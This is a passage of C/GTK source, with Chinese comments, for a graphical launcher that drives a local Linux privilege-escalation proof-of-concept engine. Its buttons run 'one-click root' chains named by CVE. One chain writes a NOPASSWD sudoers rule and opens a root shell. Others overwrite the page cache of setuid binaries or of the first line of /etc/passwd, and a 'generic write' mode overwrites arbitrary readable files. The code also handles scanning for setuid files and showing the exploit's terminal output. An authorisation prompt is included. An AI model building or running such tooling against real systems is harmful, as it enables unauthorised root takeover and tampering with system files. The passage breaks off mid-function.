    g_string_truncate(a->run, 0);
    log_trim(a);
}

/*
 * 单独的回车 (后面不是 \n): 把当前这一行清掉, 让进度条原地刷新。
 * 不这样处理的话, 每次刷新都会接在同一行尾巴上, 折行后看起来像一堆
 * 重叠的乱码。
 */
static void log_carriage_return(App *a)
{
    GtkTextIter end, bol;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    bol = end;
    gtk_text_iter_set_line_offset(&bol, 0);
    if (!gtk_text_iter_equal(&bol, &end))
        gtk_text_buffer_delete(a->logbuf, &bol, &end);
}

static void log_append_plain(App *a, const char *text)
{
    GtkTextIter end;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_insert(a->logbuf, &end, text, -1);
    log_scroll_bottom(a);
}

/* SGR 参数解析: 支持 0/1/2/22/30-37/39/90-97 */
static void sgr_apply(App *a, const char *params)
{
    gchar **parts;
    int i;

    if (!params || !*params) {
        a->cur_fg = -1;
        a->cur_bold = a->cur_dim = 0;
        return;
    }

    parts = g_strsplit(params, ";", -1);
    for (i = 0; parts[i]; i++) {
        int v;

        if (!*parts[i]) {
            /* 空参数等价于 0, 但 "0;" 这类尾部空项忽略即可 */
            continue;
        }
        v = atoi(parts[i]);
        if (v == 0) {
            a->cur_fg = -1;
            a->cur_bold = a->cur_dim = 0;
        } else if (v == 1) {
            a->cur_bold = 1;
        } else if (v == 2) {
            a->cur_dim = 1;
        } else if (v == 22) {
            a->cur_bold = a->cur_dim = 0;
        } else if (v >= 30 && v <= 37) {
            a->cur_fg = v - 30;
        } else if (v == 39) {
            a->cur_fg = -1;
        } else if (v >= 90 && v <= 97) {
            a->cur_fg = v - 90;
        }
    }
    g_strfreev(parts);
}

/* 逐字节解析 pty 输出 */
static void ansi_feed(App *a, const char *buf, gsize n)
{
    gsize i;

    for (i = 0; i < n; i++) {
        unsigned char c = (unsigned char)buf[i];

        switch (a->ansi_state) {
        case 0:
            if (c == 0x1b) {
                log_flush(a);
                a->ansi_state = 1;
            } else if (c == '\r') {
                /* \r\n 是 pty 的常规换行, 交给后面的 \n; 单独 \r 是进度刷新 */
                if (i + 1 < n && buf[i + 1] == '\n') {
                    /* 忽略 */
                } else if (i + 1 < n) {
                    log_carriage_return(a);
                }
            } else if (c == '\b') {
                if (a->run->len > 0)
                    g_string_truncate(a->run, a->run->len - 1);
            } else if (c == '\a') {
                /* 响铃忽略 */
            } else {
                g_string_append_c(a->run, (char)c);
                if (a->run->len >= 4096)
                    log_flush(a);
            }
            break;

        case 1:
            if (c == '[') {
                a->ansi_state = 2;
                g_string_truncate(a->csi, 0);
            } else if (c == ']') {
                a->ansi_state = 3;
            } else if (c == '(' || c == ')') {
                a->ansi_state = 4;   /* 字符集切换, 吃掉一个字节 */
            } else {
                a->ansi_state = 0;
            }
            break;

        case 2:
            if (c >= 0x40 && c <= 0x7e) {
                if (c == 'm')
                    sgr_apply(a, a->csi->str);
                a->ansi_state = 0;
            } else if (a->csi->len < 64) {
                g_string_append_c(a->csi, (char)c);
            } else {
                a->ansi_state = 0;
            }
            break;

        case 3:
            if (c == 0x07 || c == 0x1b)
                a->ansi_state = 0;
            break;

        case 4:
            a->ansi_state = 0;
            break;

        default:
            a->ansi_state = 0;
            break;
        }
    }
}

/* ---------------------------------------------------------------------------
 * 子进程: forkpty + execvp
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy);

static gboolean on_pty_readable(GIOChannel *src, GIOCondition cond, gpointer data)
{
    App *a = data;
    char buf[8192];
    ssize_t n;

    (void)src;

    for (;;) {
        n = read(a->master_fd, buf, sizeof(buf));
        if (n > 0) {
            ansi_feed(a, buf, (gsize)n);
            continue;
        }
        if (n < 0 && (errno == EINTR))
            continue;
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            break;

        /* n == 0 或真错误: 对端关闭 */
        log_flush(a);
        return FALSE;
    }

    log_flush(a);
    log_scroll_bottom(a);
    if (cond & (G_IO_HUP | G_IO_ERR))
        return FALSE;
    return TRUE;
}

static void on_child_exit(GPid pid, gint status, gpointer data)
{
    App *a = data;
    const char *verdict;
    const char *color = "status-ok";
    int code = -1;

    g_spawn_close_pid(pid);

    if (WIFEXITED(status))
        code = WEXITSTATUS(status);
    else if (WIFSIGNALED(status))
        code = 128 + WTERMSIG(status);

    a->last_exit = code;
    a->pid = 0;
    a->child_id = 0;
    a->running = FALSE;

    /* -check 的 1 表示"没读到配置", 与"写了没生效"是两回事 */
    if (code == 1 && a->action && !strcmp(a->action, "检查配置")) {
        char line[160];

        g_snprintf(line, sizeof(line),
                   "\n── 进程结束: 配置检查未完成 (退出码 1) ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "配置检查未完成 (退出码 1)");
        app_set_busy(a, FALSE);
        return;
    }

    if (a->stop_requested && code > 128) {
        char line[96];

        g_snprintf(line, sizeof(line), "\n── 进程结束: 已手动停止 ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已手动停止");
        app_set_busy(a, FALSE);
        return;
    }

    switch (code) {
    case 0:
        verdict = "完成 (退出码 0)";
        color = "status-ok";
        break;
    case 1:
        verdict = "未通过 / 写入未生效 (退出码 1)";
        color = "status-warn";
        break;
    case 2:
        verdict = "参数或前置条件不满足 (退出码 2)";
        color = "status-warn";
        break;
    case 3:
        verdict = "本机不可用, 未做任何写入 (退出码 3)";
        color = "status-warn";
        break;
    default:
        if (code > 128) {
            verdict = "被信号终止";
            color = "status-err";
        } else {
            verdict = "异常退出";
            color = "status-err";
        }
        break;
    }

    {
        char line[160];
        g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
        log_flush(a);
        log_append_plain(a, line);
    }

    gtk_widget_set_name(a->status_lbl, color);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);

    app_set_busy(a, FALSE);
}

static const Chain *cur_chain(App *a);

/* 启动 poc。argv 以 NULL 结尾, 不含程序名 */
static gboolean app_spawn(App *a, char **args, const char *what)
{
    struct winsize ws;
    char *argv[32];
    int argc = 0, i;
    pid_t pid;
    const Chain *c = cur_chain(a);
    int ovs = (c && c->engine == 1);
    char eflag[16] = "";

    if (ovs && !a->poc_builtin) {
        log_append_plain(a, "[!] OVS 链只能用内置引擎，不能用 --poc 指定外部程序。\n");
        return FALSE;
    }

    if (a->running) {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
        return FALSE;
    }
    a->action = what;
    if (!a->poc_path) {
        log_append_plain(a, "[!] 找不到引擎 (内置引擎异常, 可用 --poc <路径> 指定外部 poc)。\n");
        return FALSE;
    }

    memset(&ws, 0, sizeof(ws));
    ws.ws_col = PTY_COLS;
    ws.ws_row = PTY_ROWS;

    if (a->poc_builtin)
        g_snprintf(eflag, sizeof(eflag), "%s ", ovs ? "--ovs" : "--engine");

    /* 分隔线 + 命令行回显 */
    {
        char *cmdline = g_strjoinv(" ", args);
        char head[PATH_BUF * 3];
        g_snprintf(head, sizeof(head), "\n\033[2m══ %s ══\n$ %s %s%s\033[0m\n",
                   what ? what : "运行", a->poc_path, eflag, cmdline);
        ansi_feed(a, head, strlen(head));
        log_flush(a);
        g_free(cmdline);
    }

    argv[argc++] = a->poc_path;
    if (a->poc_builtin)
        argv[argc++] = (char *)(ovs ? "--ovs" : "--engine");
    for (i = 0; args[i] && argc < 30; i++)
        argv[argc++] = args[i];
    argv[argc] = NULL;

    pid = forkpty(&a->master_fd, NULL, NULL, &ws);
    if (pid < 0) {
        char msg[256];
        g_snprintf(msg, sizeof(msg), "[!] forkpty 失败: %s\n", strerror(errno));
        log_append_plain(a, msg);
        return FALSE;
    }

    if (pid == 0) {
        /* 子进程: 0/1/2 已指向 pty 从端 */
        setenv("TERM", "xterm-256color", 1);
        unsetenv("NO_COLOR");
        execvp(a->poc_path, argv);
        fprintf(stderr, "exec %s 失败: %s\n", a->poc_path, strerror(errno));
        _exit(127);
    }

    a->pid = pid;
    a->running = TRUE;
    a->stop_requested = FALSE;
    a->cur_fg = -1;
    a->cur_bold = a->cur_dim = 0;
    a->ansi_state = 0;

    fcntl(a->master_fd, F_SETFL, fcntl(a->master_fd, F_GETFL) | O_NONBLOCK);

    {
        GIOChannel *ch = g_io_channel_unix_new(a->master_fd);
        g_io_channel_set_encoding(ch, NULL, NULL);
        g_io_channel_set_buffered(ch, FALSE);
        a->watch_id = g_io_add_watch(ch, G_IO_IN | G_IO_HUP | G_IO_ERR,
                                     on_pty_readable, a);
        g_io_channel_unref(ch);
    }

    a->child_id = g_child_watch_add(pid, on_child_exit, a);

    gtk_label_set_text(GTK_LABEL(a->status_lbl), "运行中…");
    gtk_widget_set_name(a->status_lbl, "status-run");
    app_set_busy(a, TRUE);
    gtk_widget_grab_focus(a->entry_input);

    return TRUE;
}

static void app_kill(App *a, int sig)
{
    if (a->pid > 0) {
        kill(a->pid, sig);
        if (sig != SIGKILL)
            kill(-a->pid, sig);
    }
}

static gboolean kill_escalate(gpointer data)
{
    App *a = data;

    /* 只在这条子进程还挂着时才补刀, 避免 pid 被回收后误杀 */
    if (a->running && a->pid > 0) {
        kill(a->pid, SIGKILL);
        kill(-a->pid, SIGKILL);
    }
    return G_SOURCE_REMOVE;
}

static void app_stop(App *a)
{
    if (!a->running)
        return;

    a->stop_requested = TRUE;
    log_append_plain(a, "\n[*] 正在终止子进程…\n");
    app_kill(a, SIGTERM);
    g_timeout_add(1200, kill_escalate, a);
}

/* ---------------------------------------------------------------------------
 * 界面部件
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy)
{
    GtkWidget *w[] = {
        a->btn_check, a->btn_test, a->btn_lpe, a->btn_write, a->btn_find,
        a->combo,
    };
    int i;

    for (i = 0; i < (int)(sizeof(w) / sizeof(w[0])); i++)
        gtk_widget_set_sensitive(w[i], !busy);
    gtk_widget_set_sensitive(a->btn_stop, busy);

    if (busy)
        gtk_spinner_start(GTK_SPINNER(a->spinner));
    else
        gtk_spinner_stop(GTK_SPINNER(a->spinner));
}

/* 当前选中的链: 0 表示"全部" -> NULL */
static const Chain *cur_chain(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));

    if (idx <= 0 || idx > N_CHAINS)
        return NULL;
    return &chains[idx - 1];
}

static void update_desc(App *a)
{
    const Chain *c = cur_chain(a);

    if (!c) {
        gtk_label_set_markup(GTK_LABEL(a->lbl_name),
                             "<b>全部（dirtychains 五链）</b>");
        gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                           "检查配置与自测会依次跑完 dirtychains 五链；OVS 链请单独选择后再操作。");
        gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
        return;
    }

    {
        char *mk = g_markup_printf_escaped("<b>%s</b>", c->name);
        gtk_label_set_markup(GTK_LABEL(a->lbl_name), mk);
        g_free(mk);
    }
    gtk_label_set_text(GTK_LABEL(a->lbl_desc), c->desc);
    gtk_label_set_text(GTK_LABEL(a->lbl_need), c->need);
}

static void side_select(App *a, int idx);

static void on_combo_changed(GtkComboBox *box, gpointer data)
{
    App *a = data;

    (void)box;
    update_desc(a);
    /* 下拉框改了, 抽屉列表跟着选中 (side_sync 防止回环) */
    side_select(a, gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)));
}

/* 简易提示对话框 */
static void show_info(App *a, GtkMessageType type, const char *title,
                      const char *primary, const char *secondary)
{
    GtkWidget *dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                            GTK_DIALOG_MODAL |
                                            GTK_DIALOG_DESTROY_WITH_PARENT,
                                            type, GTK_BUTTONS_OK,
                                            "%s", primary);
    gtk_window_set_title(GTK_WINDOW(dlg), title);
    if (secondary)
        gtk_message_dialog_format_secondary_text(GTK_MESSAGE_DIALOG(dlg),
                                                 "%s", secondary);
    gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);
}

static gboolean confirm_run(App *a, const char *what, const char *cmdline,
                            const char *note)
{
    GtkWidget *dlg;
    gint resp;

    dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                 GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
                                 GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE,
                                 "确认执行 %s？", what);
    gtk_window_set_title(GTK_WINDOW(dlg), "确认");
    gtk_message_dialog_format_secondary_text(
        GTK_MESSAGE_DIALOG(dlg),
        "将要运行：\n\n%s\n\n%s\n"
        "请确认这是你自己的机器、且已获得授权。", cmdline, note);
    gtk_dialog_add_buttons(GTK_DIALOG(dlg),
                           "取消", GTK_RESPONSE_CANCEL,
                           "执行", GTK_RESPONSE_OK, NULL);
    gtk_dialog_set_default_response(GTK_DIALOG(dlg), GTK_RESPONSE_CANCEL);
    resp = gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);

    return resp == GTK_RESPONSE_OK;
}

/* ---------------------------------------------------------------------------
 * 动作
 * ------------------------------------------------------------------------ */
static const char *entry_text(GtkWidget *e)
{
    const char *s = gtk_entry_get_text(GTK_ENTRY(e));

    return (s && *s) ? s : NULL;
}

static void act_check(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-check", NULL };

        app_spawn(a, ovs_args, "检查 OVS 链前置条件");
        return;
    }

    args[0] = (char *)(c ? c->id : "-check");
    if (c) {
        args[1] = "-check";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "检查本链所需内核配置" : "检查全部链的内核配置");
}

static void act_test(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-scan", NULL };

        app_spawn(a, ovs_args, "OVS 链自检（读原语）");
        return;
    }

    args[0] = (char *)(c ? c->id : "-test");
    if (c) {
        args[1] = "-test";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "自测本链写原语" : "全部自测");
}

static void act_find(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    char *args[] = { "-find", NULL };

    app_spawn(a, args, "扫描 setuid root 文件");
}

static void act_lpe(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[8];
    int n = 0;
    const char *tgt;
    char cmd[600];

    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "「全部六条链」只用于配置检查与自测；"
                  "提权和通用写必须指定其中一条。");
        return;
    }

    /* OVS 链走另一套参数：-start 直接在 host 上写 sudoers 并弹 root shell */
    if (c->engine == 1) {
        char *ovs_args[3];
        int on = 0;

        ovs_args[on++] = "-start";
        if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
            ovs_args[on++] = "-v";
        ovs_args[on] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --ovs -start", a->poc_path);
        if (!confirm_run(a, c->name, cmd,
                         "这条链会在 /etc/sudoers.d 下写一条 "
                         "NOPASSWD 规则，然后打开 root shell。"))
            return;
        app_spawn(a, ovs_args, "OVS 一键提权");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-start";
    if ((tgt = entry_text(a->entry_target)) != NULL) {
        args[n++] = "-t";
        args[n++] = (char *)tgt;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -start%s%s%s",
               a->poc_path, c->id,
               tgt ? " -t " : "", tgt ? tgt : "",
               gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup))
                   ? " -nobackup" : "");

    if (!confirm_run(a, c->name, cmd,
                     "这条链会直接修改磁盘上某个 setuid 文件的页缓存，"
                     "并在成功后把当前会话接管为 root。"))
        return;

    app_spawn(a, args, "一键提权");
}

static void act_write(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[10];
    int n = 0;
    const char *to, *set, *off;
    char cmd[700];

    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "43500 的写位置固定在 /etc/passwd 首行，不支持 -to/-set。");
        return;
    }
    to = entry_text(a->entry_to);
    set = entry_text(a->entry_set);
    if (!to || !set) {
        show_info(a, GTK_MESSAGE_INFO, "缺少参数",
                  "通用写需要同时指定目标文件与内容文件。",
                  "目标文件只需可读：写的是页缓存，不落盘、不需要写权限。");
        return;
    }
    if (!strcmp(c->id, "-2026-43500")) {
        show_info(a, GTK_MESSAGE_INFO, "该链不支持通用写",
                  "CVE-2026-43500 只能改 /etc/passwd 首行。",
                  "想验证它请直接点「一键提权」。");
        return;
    }
    if (c->engine == 1) {
        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                  "CVE-2026-64531 的写原语只能做 32 位递减，"
                  "不能整段写文件。",
                  "请直接用「一键提权」或「自测」。");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-to";
    args[n++] = (char *)to;
    args[n++] = "-set";
    args[n++] = (char *)set;
    if ((off = entry_text(a->entry_offset)) != NULL) {
        args[n++] = "-offset";
        args[n++] = (char *)off;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -to %s -set %s%s%s",
               a->poc_path, c->id, to, set,
               off ? " -offset " : "", off ? off : "");
    if (!confirm_run(a, "通用写", cmd,
                     "写的是页缓存而非磁盘，目标只需读权限；"
                     "写完会读回校验，但不会执行目标。"))
        return;

    app_spawn(a, args, "通用写");
}

static void on_toggle_expand(GtkWidget *w, gpointer data)
{
    App *a = data;
    gboolean on = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(w));

    if (a->revealer)
        gtk_revealer_set_reveal_child(GTK_REVEALER(a->revealer), on);
    if (a->lbl_expand)
        gtk_label_set_text(GTK_LABEL(a->lbl_expand), on ? "收起" : "展开");
    if (a->img_expand)
        gtk_image_set_from_icon_name(GTK_IMAGE(a->img_expand),
                                     on ? "go-down-symbolic"
                                        : "go-next-symbolic",
                                     GTK_ICON_SIZE_MENU);
}

static void act_stop(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    app_stop(a);
}

static void act_send(GtkWidget *w, gpointer data)
{
    App *a = data;
    const char *txt;

    (void)w;
    if (!a->running || a->master_fd < 0)
        return;

    txt = gtk_entry_get_text(GTK_ENTRY(a->entry_input));
    if (txt && *txt) {
        if (write(a->master_fd, txt, strlen(txt)) < 0) {
            /* pty 已关闭, 忽略 */
        }
    }
    if (write(a->master_fd, "\r", 1) < 0) {
        /* 同上 */
    }
    gtk_entry_set_text(GTK_ENTRY(a->entry_input), "");
}

static void act_ctrlc(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;
    if (a->running && a->master_fd >= 0) {
        if (write(a->master_fd, "\003", 1) < 0) {
            return;
        }
    }
}

static void on_entry_activate(GtkEntry *e, gpointer data)
{
    act_send(GTK_WIDGET(e), data);
}

/* 文件名浏览 */
static void on_file_set(GtkFileChooserButton *b, gpointer data)
{
    char *fn = gtk_file_chooser_get_filename(GTK_FILE_CHOOSER(b));

    if (fn) {
        gtk_entry_set_text(GTK_ENTRY(data), fn);
        g_free(fn);
    }
}

static GtkWidget *make_file_button(const char *title, GtkWidget *entry)
{
    GtkWidget *b = gtk_file_chooser_button_new(title, GTK_FILE_CHOOSER_ACTION_OPEN);

    gtk_file_chooser_set_current_folder(GTK_FILE_CHOOSER(b), g_get_home_dir());
    gtk_widget_set_size_request(b, 132, -1);
    g_signal_connect(b, "file-set", G_CALLBACK(on_file_set), entry);
    return b;
}

/* ---------------------------------------------------------------------------
 * 界面搭建
 * ------------------------------------------------------------------------ */
static void install_css(void)
{
    static const char *css =
        /*
         * 窗口自身必须有一层不透明底色。置成 transparent 时, 无合成器的
         * X11 (多数 XFCE 会话) 不会清窗口像素, 拖动/缩放时漏画的区域会
         * 直接露出桌面图标, 看起来就是"画面撕裂"。
         */
        "#mainwin { background-color: #eef4fb; }\n"
        "#mainwin, #mainwin label { color: #24323f; }\n"

        /* 标题栏 */
        "#mainwin headerbar {\n"
        "  background-image: none;\n"
        "  background-color: #f1f7fd;\n"
        "  border-bottom: 1px solid #d3e2f0;\n"
        "  box-shadow: none;\n"
        "  min-height: 38px;\n"
        "}\n"
        "#mainwin headerbar label { color: #1e2c3a; }\n"
        "#mainwin headerbar .subtitle { color: #5a7691; font-size: 9pt; }\n"
        "#mainwin headerbar button {\n"
        "  background-image: none;\n"
        "  background-color: transparent;\n"
        "  border: none;\n"
        "  box-shadow: none;\n"
        "}\n"
        "#mainwin headerbar button:hover { background-color: #dcebf8; }\n"

        /* 卡片 */
        "#mainwin frame.card {\n"
        "  background-color: rgba(251,253,255,0.50);\n"
        "  border: 1px solid #d5e5f4;\n"
        "  border-radius: 12px;\n"
        "}\n"
        "#mainwin frame.card > label {\n"
        "  background-color: #f9fcff;\n"
        "  color: #4a6b8a;\n"
        "  font-weight: bold;\n"
        "  padding: 0 4px;\n"
        "}\n"

        /*
         * 日志区必须是"不透明"的白。
         *
         * GtkTextView 有独立的 X11 子窗口: 背景一旦设成 transparent 或
         * 半透明, 在没有合成器的会话里这个子窗口就不清屏, 直接露出未定义
         * 像素 —— 表现就是一块纯黑或半截花屏。GtkScrolledWindow 同理,
         * 有些 GTK 版本根本不画它的背景。
         *
         * 所以这里把 frame / scrolledwindow / viewport / textview 四层
         * 全部显式设成实白, 哪一层被绘制都能兜住, 与 GTK 版本无关。
         */
        "#mainwin #logcard {\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #d5e5f4;\n"
        "  border-radius: 12px;\n"
        "  padding: 0;\n"
        "}\n"
        "#mainwin #logcard scrolledwindow,\n"
        "#mainwin #logcard viewport,\n"
        "#mainwin #logcard textview,\n"
        "#mainwin #logcard textview text {\n"
        "  background-image: none;\n"
        "  background-color: #ffffff;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  color: #2b3644;\n"
        "}\n"
        "#mainwin #logview {\n"
        "  font-family: \"Noto Sans Mono CJK SC\", \"Source Han Mono SC\", \n"
        "               \"Sarasa Mono SC\", \"WenQuanYi Micro Hei Mono\", \n"
        "               \"WenQuanYi Zen Hei Mono\", \"Ubuntu Mono\", \n"
        "               \"DejaVu Sans Mono\", monospace;\n"
        "  font-size: 12px;\n"
        "  padding: 6px;\n"
        "}\n"

        /* 输入控件 */
        "#mainwin entry {\n"
        "  background-image: none;\n"
        "  background-color: rgba(255,255,255,0.56);\n"
        "  border: 1px solid rgba(163,192,217,0.62);\n"
        "  border-radius: 8px;\n"
        "  padding: 4px 8px;\n"
        "  color: #1f2b38;\n"
        "}\n"
        "#mainwin entry:focus { border-color: #74aede; }\n"
        "#mainwin button {\n"
        "  background-image: none;\n"
        "  background-color: #ffffff;\n"
        "  border: 1px solid #cfdfee;\n"
        "  border-radius: 8px;\n"
        "  padding: 3px 12px;\n"
        "  color: #21313f;\n"
        "}\n"
        "#mainwin button:hover { background-color: #eef7ff; border-color: #a9cbe8; }\n"
        "#mainwin button:active, #mainwin button:checked { background-color: #dcecfb; }\n"
        "#mainwin button:disabled {\n"
        "  color: #a8b6c4;\n"
        "  background-color: #f5f9fd;\n"
        "  border-color: #e2ecf5;\n"
        "}\n"
        "#mainwin button.suggested-action {\n"
        "  background-color: #79b6e6;\n"
        "  border-color: #5d9fd4;\n"
        "  color: #ffffff;\n"
        "  font-weight: bold;\n"
        "}\n"
        "#mainwin button.suggested-action:hover { background-color: #8ac4ee; }\n"
        "#mainwin button.destructive-action {\n"
        "  background-color: #ef9a9a;\n"
        "  border-color: #dd8484;\n"
        "  color: #ffffff;\n"
        "}\n"

        /* 左侧任务抽屉: 不画自身底色, 直接透出壁纸 */
        "#mainwin #sidebar {\n"
        "  background-color: transparent;\n"
        "  border-right: 1px solid rgba(150,180,210,0.45);\n"
        "}\n"
        "#mainwin #sidescroll, #mainwin #sidescroll viewport { background-color: transparent; }\n"
        "#mainwin #tasklist { background-color: transparent; }\n"
        "#mainwin #tasklist row {\n"
        "  background-color: transparent;\n"
        "  border-radius: 10px;\n"
        "  padding: 7px 10px;\n"
        "  margin: 1px 0;\n"
        "  min-height: 26px;\n"
        "}\n"
        "#mainwin #tasklist row:hover { background-color: #f4f8fc; }\n"
        "#mainwin #tasklist row:selected { background-color: #eaf1f8; }\n"
        "#mainwin #tasklist row label { color: #2b3a49; font-size: 11pt; }\n"
        "#mainwin #tasklist row:selected label { color: #12314c; font-weight: bold; }\n"

        /* 状态与提示 */
        "#mainwin #status-ok   { color: #1c7a44; font-weight: bold; }\n"
        "#mainwin #status-warn { color: #9a6a00; font-weight: bold; }\n"
        "#mainwin #status-err  { color: #b3261e; font-weight: bold; }\n"
        "#mainwin #status-run  { color: #1f5fa8; font-weight: bold; }\n"
        "#mainwin #title-name  { color: #1b3a57; }\n"
        "#mainwin #hint { color: #5f7d99; font-size: 9pt; }\n"
        "#mainwin #banner-warn {\n"
        "  background-color: #fdecea;\n"
        "  color: #9c1c16;\n"
        "  border: 1px solid #f0b7b1;\n"
        "  border-radius: 10px;\n"
        "  padding: 6px 10px;\n"
        "}\n"
        "tooltip, tooltip label { color: #f7fbff; }\n";
    GtkCssProvider *p = gtk_css_provider_new();

    gtk_css_provider_load_from_data(p, css, -1, NULL);
    gtk_style_context_add_provider_for_screen(
        gdk_screen_get_default(),
        GTK_STYLE_PROVIDER(p),
        GTK_STYLE_PROVIDER_PRIORITY_APPLICATION);
    g_object_unref(p);
}

static void make_log_tags(App *a)
{
    static const char *names[8] = {
        "fg-black", "fg-red", "fg-green", "fg-yellow",
        "fg-blue", "fg-magenta", "fg-cyan", "fg-white"
    };
    /* 浅色纸面配色, 保证在白底上也够深 */
    static const char *colors[8] = {
        "#6b7684", "#c0392b", "#1f7a3d", "#8a6100",
        "#1f5fa8", "#8b3fa8", "#0f6f7a", "#232b36"
    };
    int i;

    for (i = 0; i < 8; i++)
        a->tag_fg[i] = gtk_text_buffer_create_tag(a->logbuf, names[i],
                                                  "foreground", colors[i], NULL);
    a->tag_bold = gtk_text_buffer_create_tag(a->logbuf, "bold", "weight",
                                             PANGO_WEIGHT_BOLD, NULL);
    a->tag_dim = gtk_text_buffer_create_tag(a->logbuf, "dim", "foreground",
                                            "#8b96a3", NULL);
}

static GtkWidget *build_params(App *a)
{
    GtkWidget *grid = gtk_grid_new();
    GtkWidget *lbl, *browse;

    gtk_grid_set_row_spacing(GTK_GRID(grid), 6);
    gtk_grid_set_column_spacing(GTK_GRID(grid), 8);

    /* 三列统一: 标签 / 输入框 / 浏览按钮, 保证三行按钮右边缘对齐 */

    /* -t 目标 */
    lbl = gtk_label_new("-t 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_widget_set_size_request(lbl, 68, -1);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 0, 1, 1);

    a->entry_target = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                   "留空则自动选择 setuid-root 的 su");
    gtk_widget_set_hexpand(a->entry_target, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_target, 1, 0, 1, 1);

    browse = make_file_button("选择 setuid 目标", a->entry_target);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 0, 1, 1);

    /* -to 目标 */
    lbl = gtk_label_new("-to 目标");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 1, 1, 1);

    a->entry_to = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_to),
                                   "要被覆盖的文件 (只需可读)");
    gtk_widget_set_hexpand(a->entry_to, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_to, 1, 1, 1, 1);

    browse = make_file_button("选择目标文件", a->entry_to);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 1, 1, 1);

    /* -set 内容 */
    lbl = gtk_label_new("-set 内容");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 2, 1, 1);

    a->entry_set = gtk_entry_new();
    gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_set),
                                   "内容来源文件");
    gtk_widget_set_hexpand(a->entry_set, TRUE);
    gtk_grid_attach(GTK_GRID(grid), a->entry_set, 1, 2, 1, 1);

    browse = make_file_button("选择内容文件", a->entry_set);
    gtk_grid_attach(GTK_GRID(grid), browse, 2, 2, 1, 1);

    /* 偏移 + 选项 */
    lbl = gtk_label_new("-offset");
    gtk_widget_set_halign(lbl, GTK_ALIGN_END);
    gtk_grid_attach(GTK_GRID(grid), lbl, 0, 3, 1, 1);

    {
        GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 8);

        a->entry_offset = gtk_entry_new();
        gtk_entry_set_width_chars(GTK_ENTRY(a->entry_offset), 8);
